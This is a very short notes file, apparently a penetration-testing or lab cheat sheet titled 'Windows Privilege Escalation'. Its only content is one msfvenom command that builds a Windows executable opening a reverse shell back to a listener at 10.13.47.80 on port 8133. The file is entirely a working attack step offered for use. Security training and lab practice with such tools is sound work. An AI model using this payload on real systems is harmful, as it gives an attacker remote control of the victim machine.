# Windows Privilege Escalation

## Creating a Reverse Shell Executable (.exe)
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.13.47.80 LPORT=8133 -f exe -o reverse.exe
```
